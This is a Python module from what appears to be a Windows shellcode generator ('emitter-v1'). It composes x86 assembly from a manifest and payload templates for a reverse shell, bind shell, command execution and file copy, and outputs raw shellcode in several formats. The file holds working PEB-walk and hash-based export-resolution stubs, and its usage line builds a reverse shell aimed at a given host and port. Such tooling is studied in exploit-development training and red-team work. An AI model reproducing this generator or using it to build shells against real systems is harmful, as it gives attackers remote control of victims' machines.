"""Assembly build pipeline: manifest → generated.asm + generated_contract.md.

Usage:
    uv run emitter manifests/revshell.yaml --template reverse_shell \
        --lhost 192.168.1.116 --lport 9001 --out emitter_out/
"""
from __future__ import annotations

import argparse
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from datetime import datetime

from .api_database import API_DATABASE, MODULE_LOAD_ORDER
from .api_emitter import emit_module_resolution
from .doc_gen import emit_full_contract_md
from .schema import Manifest
from .schema import load as load_manifest
from .stack_alloc import StackLayout, build_layout
from .string_emitter import emit_all_strings
from .structure_emitter import emit_all_structures
from .payload_templates.base import PayloadTemplate, TemplateConfig
from Tools.strings import emit_push, to_dwords

# ---------------------------------------------------------------------------
# Framework stubs (extracted verbatim from shellcode-04.py)
# These are the reusable PEB-walk and export-resolution routines.
# ---------------------------------------------------------------------------

FRAMEWORK_STUBS = """\
find_module:
    call get_first_ldr_entry
    jmp find_kernel32_entry

get_first_ldr_entry:
    xor ecx, ecx
    mov eax, fs:[ecx + 0x30]
    mov eax, [eax + 0x0c]
    mov eax, [eax + 0x1c]
    sub eax, 0x10
    ret

find_kernel32_entry:
    mov esi, [eax + 0x30]
    cmp word ptr [esi], 0x004b
    jne next
    cmp word ptr [esi+2], 0x0045
    jne next
    cmp word ptr [esi+12], 0x0033
    jne next
    mov ebx, [eax + 0x18]
    ret

next:
    mov eax, [eax + 0x10]
    sub eax, 0x10
    jmp find_kernel32_entry

get_export_directory:
    mov eax, [ebx+0x3c]
    add eax, ebx
    mov eax, [eax+0x78]
    add eax, ebx
    ret

get_export_tables:
    mov ecx, [eax+0x18]
    mov edi, [eax+0x20]
    add edi, ebx
    mov edx, [eax+0x24]
    add edx, ebx
    mov esi, [eax+0x1c]
    add esi, ebx
    ret

save_export_context:
    mov [ebp-0x04], ebx
    mov [ebp-0x08], edi
    mov [ebp-0x0c], edx
    mov [ebp-0x10], esi
    mov [ebp-0x14], ecx
    ret

resolve_export_by_hash:
    mov [ebp-0x18], eax
    xor ecx, ecx

find_export_loop:
    mov edi, [ebp - 0x08]
    mov eax, [edi + ecx*4]
    add eax, [ebp - 0x04]
    mov esi, eax
    call compute_hash
    cmp edx, [ebp-0x18]
    je resolve_matched_export

inc_next:
    inc ecx
    cmp ecx, [ebp - 0x14]
    jl find_export_loop

compute_hash:
    xor eax, eax
    xor edx, edx
    cld

hash_loop:
    lodsb
    test al, al
    jz hash_done
    ror edx, 0x0d
    movzx eax, al
    add edx, eax
    jmp hash_loop

hash_done:
    ret

resolve_matched_export:
    mov edx, [ebp - 0x0c]
    movzx eax, word ptr [edx + ecx*2]
    mov esi, [ebp - 0x10]
    mov eax, [esi + eax*4]
    add eax, [ebp - 0x04]
    ret
"""


# ---------------------------------------------------------------------------
# Build result
# ---------------------------------------------------------------------------


@dataclass
class BuildResult:
    manifest_path: str
    asm: str
    contract_md: str
    shellcode_bytes: bytes | None = None
    hex_str: str | None = None
    py_bytes: str | None = None
    c_array: str | None = None
    layout: StackLayout | None = None
    assembler: str | None = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _dll_load_block(dll: str, manifest: Manifest, layout: StackLayout) -> str:
    """Generate the LoadLibraryA block for a secondary DLL."""
    module_slot = layout.slot(dll)
    loadlib_slot = layout.slot("LoadLibraryA")

    push_result = emit_push(dll, badchars=manifest.badchars)
    cleanup = len(to_dwords(dll)) * 4

    return "\n".join([
        f"; ── Loading {dll} via LoadLibraryA ──────────────────────────────────",
        "",
        push_result.asm,
        f"    push esi                    ; lpLibFileName = &{dll}",
        f"    call dword ptr {loadlib_slot.ebp_ref}",
        f"    mov  {module_slot.ebp_ref}, eax    ; {dll} base",
        f"    add  esp, 0x{cleanup:02x}           ; pop string from stack",
        "",
        f"    mov  ebx, {module_slot.ebp_ref}",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ])


def _bytes_to_hex_str(raw: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in raw)


def _bytes_to_py(raw: bytes) -> str:
    return f'shellcode = b"{_bytes_to_hex_str(raw)}"'


def _bytes_to_c(raw: bytes) -> str:
    hex_bytes = [f"0x{b:02x}" for b in raw]
    rows = [hex_bytes[i:i + 16] for i in range(0, len(hex_bytes), 16)]
    body = "\n".join("    " + ", ".join(row) + "," for row in rows)
    return f"unsigned char shellcode[] = {{\n{body}\n}};\n// Length: {len(raw)} bytes"


def _strip_hash_comments(asm: str) -> str:
    return "\n".join(line.split("#")[0] for line in asm.splitlines())


def _to_nasm(asm: str) -> str:
    """Convert emitter Intel syntax to nasm flat-binary syntax.

    Differences handled:
    - Prepend 'BITS 32' so nasm knows the mode
    - Strip # comments (emitter uses these for notes)
    - 'dword/word/byte ptr [...]' → 'dword/word/byte [...]'
    - 'fs:[...]' → '[fs:...]'  (segment register syntax)
    """
    lines = ["BITS 32"]
    for line in asm.splitlines():
        line = line.split("#")[0].rstrip()
        line = re.sub(r'\bfs:\[', '[fs:', line)
        line = re.sub(r'\b(dword|word|byte)\s+ptr\b', r'\1', line, flags=re.IGNORECASE)
        lines.append(line)
    return "\n".join(lines)


def _try_assemble_keystone(asm: str) -> bytes | None:
    try:
        import keystone
    except ImportError:
        return None
    try:
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        encoding, _ = ks.asm(_strip_hash_comments(asm))
        return bytes(encoding)
    except Exception:
        return None


def _try_assemble_nasm(asm: str) -> bytes | None:
    if not shutil.which("nasm"):
        return None
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            src = pathlib.Path(tmpdir) / "shellcode.asm"
            out = pathlib.Path(tmpdir) / "shellcode.bin"
            src.write_text(_to_nasm(asm))
            result = subprocess.run(
                ["nasm", "-f", "bin", "-o", str(out), str(src)],
                capture_output=True,
                text=True,
            )
            if result.returncode != 0:
                return None
            return out.read_bytes()
    except Exception:
        return None


def _try_assemble(asm: str) -> tuple[bytes, str] | tuple[None, None]:
    """Try keystone, then nasm. Returns (bytes, assembler_name) or (None, None)."""
    raw = _try_assemble_keystone(asm)
    if raw is not None:
        return raw, "keystone"
    raw = _try_assemble_nasm(asm)
    if raw is not None:
        return raw, "nasm"
    return None, None


def _load_template(name: str) -> PayloadTemplate:
    """Load a payload template by short name."""
    registry = {
        "reverse_shell": "Tools.emitter.payload_templates.reverse_shell.ReverseShellTemplate",
        "run_command":   "Tools.emitter.payload_templates.run_command.RunCommandTemplate",
        "copy_file":     "Tools.emitter.payload_templates.copy_file.CopyFileTemplate",
        "bind_shell":    "Tools.emitter.payload_templates.bind_shell.BindShellTemplate",
    }
    if name not in registry:
        raise ValueError(
            f"Unknown template: '{name}'. Available: {sorted(registry.keys())}"
        )
    module_path, cls_name = registry[name].rsplit(".", 1)
    import importlib
    mod = importlib.import_module(module_path)
    cls = getattr(mod, cls_name)
    return cls()


# ---------------------------------------------------------------------------
# Assembly composition
# ---------------------------------------------------------------------------


def compose_asm(
    manifest: Manifest,
    layout: StackLayout,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"

    # Manifest push-strings whose value matches a DLL name are handled inline
    # in the module-loading block; skip them in the string section.
    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "; AUTO-GENERATED by emitter-v1",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
        "    _start:",
        "        jmp main",
        "",
        "; ── Framework Stubs ────────────────────────────────────────────────",
        "",
        FRAMEWORK_STUBS,
        "; ── Main ───────────────────────────────────────────────────────────",
        "",
        "main:",
        "    mov  ebp, esp",
        "    add  esp, 0xfffffb00",
        "",
        "    ; Bootstrap: find kernel32 via PEB walk",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                parts.append(f"; NOTE: {mi.dll} requires LoadLibraryA in manifest")
                continue
            parts.append(_dll_load_block(mi.dll, manifest, layout))

        resolution = emit_module_resolution(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    parts += [
        "; ── String Construction ─────────────────────────────────────────────",
        "",
    ]
    str_asm = emit_all_strings(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    parts += [
        "; ── Structure Initialization ────────────────────────────────────────",
        "",
    ]
    struct_asm = emit_all_structures(manifest, layout)
    if struct_asm.strip():
        parts.append(struct_asm)
    else:
        parts += ["; (no structures)", ""]

    parts += [
        "; ── Payload ─────────────────────────────────────────────────────────",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template — insert payload assembly here)", ""]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def build(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
) -> BuildResult:
    """Run the full build pipeline. Returns a BuildResult."""
    manifest = load_manifest(manifest_path)
    layout = build_layout(manifest)
    config = config or TemplateConfig()

    template = _load_template(template_name) if template_name else None
    asm = compose_asm(manifest, layout, manifest_path, template, config)
    contract_md = emit_full_contract_md(manifest, layout)

    raw: bytes | None = None
    assembler: str | None = None
    if assemble:
        raw, assembler = _try_assemble(asm)

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=raw,
        hex_str=_bytes_to_hex_str(raw) if raw else None,
        py_bytes=_bytes_to_py(raw) if raw else None,
        c_array=_bytes_to_c(raw) if raw else None,
        layout=layout,
        assembler=assembler,
    )


def write_outputs(result: BuildResult, out_dir: str) -> None:
    """Write all build outputs to out_dir."""
    base = pathlib.Path(out_dir)
    (base / "asm").mkdir(parents=True, exist_ok=True)
    (base / "Documentation").mkdir(parents=True, exist_ok=True)

    (base / "asm" / "generated.asm").write_text(result.asm)
    (base / "Documentation" / "contract.md").write_text(result.contract_md)

    if result.shellcode_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode.bin").write_bytes(result.shellcode_bytes)
        (base / "bin" / "shellcode.hex").write_text(result.hex_str or "")
        (base / "bin" / "shellcode.py").write_text(result.py_bytes or "")
        (base / "bin" / "shellcode.c").write_text(result.c_array or "")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(
        description="emitter-v1: manifest → assembly + contract",
    )
    parser.add_argument("manifest", help="Path to manifest YAML file")
    parser.add_argument(
        "--template",
        choices=["reverse_shell", "run_command", "copy_file", "bind_shell"],
    )
    parser.add_argument("--out", default="emitter_out", help="Output directory")
    parser.add_argument("--lhost", default="127.0.0.1")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--command", default="cmd.exe")
    parser.add_argument("--src", default="C:\\source.txt")
    parser.add_argument("--dst", default="C:\\dest.txt")
    parser.add_argument("--no-assemble", action="store_true")

    args = parser.parse_args()
    config = TemplateConfig(
        lhost=args.lhost,
        lport=args.lport,
        command=args.command,
        src_path=args.src,
        dst_path=args.dst,
    )

    result = build(
        args.manifest,
        template_name=args.template,
        config=config,
        out_dir=args.out,
        assemble=not args.no_assemble,
    )
    write_outputs(result, args.out)

    print(f"[+] Generated: {args.out}/asm/generated.asm")
    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
    if result.shellcode_bytes:
        print(f"[+] Assembler: {result.assembler}")
        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes")
        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
    else:
        print("[*] Assembly skipped (no assembler available or --no-assemble)")


if __name__ == "__main__":
    main()
